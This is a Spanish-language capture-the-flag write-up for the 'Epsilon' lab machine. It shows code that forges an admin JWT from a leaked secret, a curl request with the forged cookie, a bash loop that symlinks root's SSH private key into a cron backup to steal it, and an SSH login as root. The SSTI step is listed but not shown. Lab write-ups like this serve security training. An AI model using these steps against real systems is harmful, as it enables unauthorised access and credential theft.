Overview

Epsilon es una máquina Linux de dificultad media que expone un repositorio Git en el servidor web. Las credenciales de AWS se filtran en los commits de Git, permitiendo descargar el código de la función Lambda. La clave secreta en el código fuente se puede usar para falsificar una cookie y acceder a la aplicación web. Finalmente, se escala a root abusando de un cronjob que ejecuta tar con enlaces simbólicos.

Key steps

  1. Escaneo y enumeración de puertos con nmap.
  2. Enumeración de la aplicación web (HTTP) y volcado del repositorio Git.
  3. Análisis de los scripts Python y extracción de credenciales de AWS Lambda.
  4. Generación de token JWT usando la clave secreta para acceso administrativo.
  5. Explotación de SSTI en la aplicación Flask para obtener shell.
  6. Escalada de privilegios usando cronjob con tar y enlaces simbólicos.

4. Explotación y acceso inicial

Generamos un token JWT de administrador usando PyJWT y lo colocamos en la cookie auth:

import jwt
secret = 'VALOR_EXTRAIDO_DEL_LAMBDA'
token = jwt.encode({"username":"admin"}, secret, algorithm="HS256")
print(token)
curl -v --cookie "auth=GENERATED_JWT_TOKEN_HERE" http://10.10.10.134/home

Se obtiene acceso administrativo a la aplicación web.

5. Escalada de privilegios

Se utiliza pspy para enumerar cronjobs y detectar backups periódicos que usan tar:

#!/bin/bash
file=`date +%N`
/usr/bin/rm -rf /opt/backups/*
/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
sleep 5
check_file=`date +%N`
/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
/usr/bin/rm -rf /opt/backups/*

Se crea un enlace simbólico de id_rsa de root a /opt/backups/checksum para capturar la clave durante el backup:

#!/bin/bash
while true; do 
    if [ -e /opt/backups/checksum ]; then 
        rm -f /opt/backups/checksum
        ln -s -f /root/.ssh/id_rsa /opt/backups/checksum 
        break
    fi; 
done

Una vez obtenido id_rsa, se conecta vía SSH como root:

ssh -i id_rsa root@10.10.10.134

Con esto se completa la resolución de la máquina Epsilon.
